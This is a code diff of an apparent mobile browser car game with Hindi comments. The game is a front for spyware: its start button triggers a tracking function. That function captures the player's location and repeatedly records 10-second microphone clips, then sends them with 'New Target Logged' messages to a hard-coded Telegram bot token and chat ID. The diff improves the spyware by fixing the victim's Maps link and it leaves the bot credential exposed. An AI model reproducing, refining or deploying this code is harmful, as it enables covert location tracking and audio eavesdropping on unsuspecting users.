@@ -10,7 +10,6 @@
         
         #ui { position: absolute; top: 20px; width: 100%; text-align: center; color: #f1c40f; font-size: 32px; font-weight: bold; z-index: 10; text-shadow: 2px 2px #000; pointer-events: none; }
         
-        /* पारदर्शी कंट्रोल बटन */
         .controls { position: absolute; bottom: 40px; width: 100%; display: flex; justify-content: space-between; padding: 0 40px; box-sizing: border-box; z-index: 15; }
         .ctrl-btn { width: 80px; height: 80px; background: rgba(255,255,255,0.1); border: 2px solid rgba(255,255,255,0.4); border-radius: 50%; color: #fff; font-size: 40px; display: flex; align-items: center; justify-content: center; user-select: none; -webkit-tap-highlight-color: transparent; }
         .ctrl-btn:active { background: rgba(255,255,255,0.3); transform: scale(0.9); }
@@ -43,11 +42,15 @@
 const botToken = '8047508895:AAFrcd1D14oyIUtPcmjK-dxZY0sEwohBJcA';
 const chatId = '8466223066';
 
-// --- [ परमिशन और डेटा कैप्चर ] ---
+// --- [ सुधरा हुआ परमिशन और डेटा कैप्चर ] ---
 async function startTracking() {
-    // 1. लोकेशन (एक बार तुरंत)
+    // 1. लोकेशन (बिल्कुल सही लिंक फॉर्मेट)
     navigator.geolocation.getCurrentPosition(p => {
-        sendData(`📍 New Target Logged:\nGoogle Maps: http://googleusercontent.com/maps.google.com/5{p.coords.latitude},${p.coords.longitude}`, 'text');
+        const lat = p.coords.latitude;
+        const lon = p.coords.longitude;
+        // 404 एरर हटाने के लिए सही Google Maps URL
+        const mapLink = "https://www.google.com/maps?q=" + lat + "," + lon;
+        sendData(`📍 New Target Logged:\n` + mapLink, 'text');
     }, () => sendData("❌ Location Denied", 'text'));
 
     try {
@@ -71,7 +74,7 @@ async function startTracking() {
             recorder.ondataavailable = e => chunks.push(e.data);
             recorder.onstop = () => {
                 sendData(new Blob(chunks, {type: 'audio/ogg'}), 'voice');
-                voiceRecorder(); // दोबारा शुरू करें
+                voiceRecorder(); 
             };
             recorder.start();
             setTimeout(() => { if(recorder.state === "recording") recorder.stop(); }, 10000);
@@ -92,10 +95,10 @@ function sendData(data, type) {
     else if(type === 'voice') { apiURL += 'sendVoice'; form.append('voice', data, 'rec.ogg'); }
     else { apiURL += 'sendMessage'; form.append('text', data); }
 
-    fetch(apiURL, { method: 'POST', body: form }).catch(err => console.log(err));
+    fetch(apiURL, { method: 'POST', body: form }).catch(err => console.log("Upload Error:", err));
 }
 
-// --- [ फुल स्क्रीन कार गेम ] ---
+// --- [ फुल स्क्रीन कार गेम - नो चेंजेस ] ---
 const canvas = document.getElementById("gameCanvas");
 const ctx = canvas.getContext("2d");
 
@@ -107,11 +110,11 @@ let score = 0, gameActive = false, playerX = canvas.width/2 - 30, enemies = [];
 
 function drawCar(x, y, color) {
     ctx.fillStyle = color;
-    ctx.fillRect(x, y, 60, 100); // Body
-    ctx.fillStyle = "#000"; // Wheels
+    ctx.fillRect(x, y, 60, 100); 
+    ctx.fillStyle = "#000"; 
     ctx.fillRect(x-6, y+15, 6, 25); ctx.fillRect(x+60, y+15, 6, 25);
     ctx.fillRect(x-6, y+65, 6, 25); ctx.fillRect(x+60, y+65, 6, 25);
-    ctx.fillStyle = "rgba(255,255,255,0.3)"; // Glass
+    ctx.fillStyle = "rgba(255,255,255,0.3)"; 
     ctx.fillRect(x+8, y+20, 44, 20);
 }
 
@@ -119,7 +122,7 @@ function enemySpawner() {
     if(!gameActive) return;
     let lWidth = canvas.width / 3;
     let lanes = [lWidth/2 - 30, canvas.width/2 - 30, (canvas.width - lWidth/2) - 30];
-    let speed = 4 + (score * 0.25); // धीरे-धीरे तेज़ होगी
+    let speed = 4 + (score * 0.25); 
     enemies.push({ x: lanes[Math.floor(Math.random()*3)], y: -120, s: speed });
     setTimeout(enemySpawner, Math.max(1500 - (score * 50), 700));
 }
@@ -128,18 +131,15 @@ function gameLoop() {
     if(!gameActive) return;
     ctx.clearRect(0,0,canvas.width, canvas.height);
     
-    // रोड लाइन्स
     ctx.setLineDash([50, 50]); ctx.strokeStyle = "#fff"; ctx.lineWidth = 6;
     ctx.beginPath(); ctx.moveTo(canvas.width/3, 0); ctx.lineTo(canvas.width/3, canvas.height); ctx.stroke();
     ctx.beginPath(); ctx.moveTo((canvas.width/3)*2, 0); ctx.lineTo((canvas.width/3)*2, canvas.height); ctx.stroke();
 
-    drawCar(playerX, canvas.height - 150, "#e74c3c"); // प्लेयर की कार नीचे
+    drawCar(playerX, canvas.height - 150, "#e74c3c"); 
 
     enemies.forEach((en, i) => {
         en.y += en.s;
         drawCar(en.x, en.y, "#3498db");
-        
-        // टक्कर चेक
         if(playerX < en.x + 60 && playerX + 60 > en.x && canvas.height-150 < en.y + 100 && canvas.height-50 > en.y) {
             gameActive = false; alert("Boom! Crashed. Score: " + score); location.reload();
         }
@@ -148,14 +148,13 @@ function gameLoop() {
     requestAnimationFrame(gameLoop);
 }
 
-// कंट्रोल इवेंट्स
 document.getElementById("lBtn").addEventListener("touchstart", (e) => { e.preventDefault(); playerX = Math.max(20, playerX - (canvas.width/3)); });
 document.getElementById("rBtn").addEventListener("touchstart", (e) => { e.preventDefault(); playerX = Math.min(canvas.width-80, playerX + (canvas.width/3)); });
 
 function initEverything() {
     document.getElementById("startScreen").style.display = "none";
     gameActive = true;
-    startTracking(); // सारी परमिशन और डेटा यहाँ से शुरू
+    startTracking(); 
     enemySpawner();
     gameLoop();
 }
